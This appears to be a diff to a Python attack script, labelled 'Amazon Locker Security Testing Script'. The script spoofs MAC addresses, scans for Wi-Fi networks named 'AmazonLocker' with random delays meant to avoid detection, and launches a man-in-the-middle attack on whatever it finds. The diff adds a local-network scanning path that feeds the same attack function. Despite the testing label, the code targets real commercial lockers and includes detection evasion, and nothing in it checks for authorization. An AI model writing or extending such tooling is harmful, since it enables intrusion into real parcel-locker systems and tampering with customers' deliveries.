@@ -27,10 +27,14 @@ def spoof_mac(interface):
 # Function to slow down scanning to avoid detection
 def slow_scan_wifi():
     print("[+] Scanning for Wi-Fi networks (Stealth Mode)...")
-    wifi_networks = os.popen("nmcli -t -f SSID dev wifi").read().split("\n")
-    locker_networks = [net for net in wifi_networks if "AmazonLocker" in net]
-    time.sleep(random.uniform(3, 7))  # Random delay to avoid detection
-    return locker_networks
+    try:
+        wifi_networks = os.popen("iw dev wlan0 scan | grep SSID").read().splitlines()  # Adjust this for your device
+        locker_networks = [net for net in wifi_networks if "AmazonLocker" in net]
+        time.sleep(random.uniform(3, 7))  # Random delay to avoid detection
+        return locker_networks
+    except Exception as e:
+        print(f"[!] Wi-Fi scanning failed: {e}")
+        return []
 
 # Function to scan local network for lockers
 def slow_scan_local_network():
@@ -112,7 +116,6 @@ async def locker_detection():
         return wifi_results[0]
 
     print("[+] No Amazon lockers detected via Wi-Fi. You can try Bluetooth or Local Network.")
-
     return None
 
 # Function to scan for Bluetooth lockers (optional)
@@ -155,7 +158,8 @@ def main():
         print("\n==== Amazon Locker Security Testing Script ====")
         print("1. Detect and Attack Nearby Locker (Wi-Fi)")
         print("2. Scan for Bluetooth Lockers")
-        print("3. Exit")
+        print("3. Scan for Local Network Lockers")
+        print("4. Exit")
 
         choice = input("Select an option: ")
 
@@ -168,6 +172,10 @@ def main():
             if target_locker:
                 mitm_attack(target_locker)
         elif choice == "3":
+            target_locker = slow_scan_local_network()
+            if target_locker:
+                mitm_attack(target_locker[0])  # Assuming first detected locker
+        elif choice == "4":
             cleanup()
         else:
             print("Invalid option. Please try again.")
